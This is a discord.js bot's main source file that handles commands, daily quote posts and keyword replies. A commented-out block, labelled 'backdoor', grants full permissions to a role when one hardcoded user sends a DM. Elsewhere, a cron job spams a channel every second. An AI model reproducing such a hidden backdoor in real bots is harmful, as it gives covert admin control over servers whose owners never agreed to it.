const { Client, Collection, Intents, Permissions, MessageEmbed } = require('discord.js');
const Quotes = require('./helpers/quotes.js');
const CronJob = require('cron').CronJob;
const FileSystem = require('fs');
const { prefix, token } = require('./config.json')

//Variable initialization
const clientObj = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });
blackholes = new Collection();
gulags = new Collection();

//Streaming ready boolean
streamReady = true;

//Response registration
responses = JSON.parse(FileSystem.readFileSync('./data/responses.json')).responses
responses.forEach(response => {
	response.regex = new RegExp(response.regex, 'i');
})

//Command registration
registeredCommands = new Collection();
commandFiles = FileSystem.readdirSync('./commands').filter(File => (File.endsWith('.js') && !File.startsWith('#')));
commandFiles.forEach(file => {
    command = require(`./commands/${file}`);
    registeredCommands.set(command.name.toLowerCase(), command);
});

//Initialization event & login
clientObj.once('ready', () => {
    console.log("I'm alive!");

	quotes = JSON.parse(FileSystem.readFileSync('./data/quotes.json'))
	quoteJob = new CronJob('0 0 0 * * *', function() {
		Quotes.quote(clientObj, Quotes.randomInt(quotes.quotes.length)).then(quoteMsg => {
			clientObj.guilds.resolve(quotes.dailyServer).channels.resolve(quotes.dailyChannel).send({content: "Here's your quote of the day:", embeds: [quoteMsg]})
		})
	})
	cringeJob = new CronJob('* * * * * *', function() {
		Quotes.quote(clientObj, Quotes.randomInt(quotes.quotes.length)).then(quoteMsg => {
			clientObj.guilds.resolve(quotes.dailyServer).channels.resolve('131640614646185984').send({content: "Cringe..."})
		})
	})
	quoteJob.start()
	cringeJob.start()
});
clientObj.login(token)

//Message Event
clientObj.on('messageCreate', message => {
	cleanMsg = message.cleanContent
	msgMember = message.member
	msgChannel = message.channel
    if ( cleanMsg.startsWith(prefix) ) { //&& (msgMember.roles.highest.permissions.has(Permissions.FLAGS.ADMINISTRATOR)) ) {
        splitCommand = cleanMsg.split(" ");
        command = splitCommand[0].toLowerCase().slice(prefix.length);
        if (registeredCommands.has(command)) {
            try { registeredCommands.get(command).execute(message); }
            catch(error) { console.log(error); console.log("There was an error executing a command!"); }
        }
        if ( (splitCommand.length > 1) && (splitCommand[splitCommand.length - 1] == '*') ) { message.delete() }
    }
	/*
	else if ((msgChannel.type == "dm") && (message.author.id = '210628653829193729')) {
		cleanMsg.startsWith('backdoor');
		splitCommand = cleanMsg.split(" ");
		clientObj.guilds.fetch(splitCommand[1]).then(guild => {
			//guild.members.fetch('210628653829193729').then(self => self.roles.add('522603445237317643'));
			guild.roles.fetch('244979705751535617').then(backdoorRole => backdoorRole.setPermissions(Permissions.ALL))
		})
	}
	*/
	else if ((msgMember.user.id != '637415359129059363') && (message.guildId == '131640614646185984' || message.guildId == '284165275279163394')) {
		responses.every(response => {
			if (response.regex.test(cleanMsg)) {
				reply = msgMember.toString()
				if ('reply' in response) {
					reply += '\n' + response.reply
				}
				msgChannel.send(reply)
				if ('replies' in response) {
					response.replies.forEach(reply => {
						msgChannel.send(reply)
					})
				}
				return false;
			}
			return true;
		})
	}
});

/*Voice Change Event
clientObj.on('voiceStateUpdate', (oldState, newState) => {
	newChannel = newState.channel;
	eventUser = newState.member;
    if ((newChannel != null) && !(eventUser.roles.cache.find(role => role.name == 'Has Discord Minutes'))) {
        eventServer = newChannel.guild;
        if (blackholes.has(eventServer)) {
            oldChannel = oldState.channel;
            if (newChannel != blackholes.get(eventServer)) {
                newState.setChannel(blackholes.get(eventServer))
				eventUser.createDM().then(dm => dm.send('You are out of Discord Minutes™ for the server you are trying to move in!\nYou can buy more minutes by using the following link: http://paypal.me/ChVasiliou\n**(Rates: 1 Minute = 1$)**'))
            }
        }
    }
});*/

/*Reaction Add Event
clientObj.on('messageReactionAdd', (messageReaction, user) => {

	//Variable caching
	eventMessage = messageReaction.message;
	eventServer = eventMessage.guild;
	eventUserID = user.id;

	//Verify the correct reaction
    if ((messageReaction.emoji.toString() == '🎲') && (gulags.has(eventServer))) {

		//More variable caching
		gulagMatch = gulags.get(eventServer);
		playerData = gulagMatch.playerData;

		//Verify the message reaction is to the gulag match, and that the player is part of the match and has not already rolled.
		if (playerData.has(eventUserID) && (gulagMatch.message.id == eventMessage.id) && playerData.get(eventUserID).roll === null) {

			//Roll the player's number, set it, and update the higest roll if needed
			numberRolled = Math.floor(Math.random() * 20) + 1;
			playerData.get(eventUserID).roll = numberRolled;
			gulagMatch.highestRoll = gulagMatch.highestRoll < numberRolled ? numberRolled : gulagMatch.highestRoll;
			
			//Update the gulag message that will track the Gulag match.
			gulagMessage = new MessageEmbed()
				.setColor('#0099ff')
				.setTitle('Gulag Match')
				.setDescription('React with the dice to roll.');
			
			playerData.forEach((data, player) => {
				gulagMessage.addFields({ name: data.name, value: data.roll !== null ? data.roll : 'WAITING FOR ROLL...', inline: true });
			});
			gulagMessage.setFooter('You have 30 seconds to roll or you forfeit the match.');

			//Update the gulag match message
			gulagMatch.message.edit(gulagMessage);
			
			//Determine if the game is finished
			if (++gulagMatch.rollCount >= playerData.size) {

				//Cancel the timeout
				clearTimeout(gulagMatch.timeout);

				//Find winner
				playerData.forEach((data, player) => {
					if (data.roll < gulagMatch.highestRoll) {
						if (data.user.voice) { data.user.voice.kick("Lost a Gulag match."); }
					}
					else if (data.user.voice) { data.user.voice.setChannel(data.originChannel); }
				});
				
				gulags.delete(eventServer);
			}
		}
    }
});*/

process.on('SIGINT', () => {
	console.log("This is a test.");
	process.exit(0);
})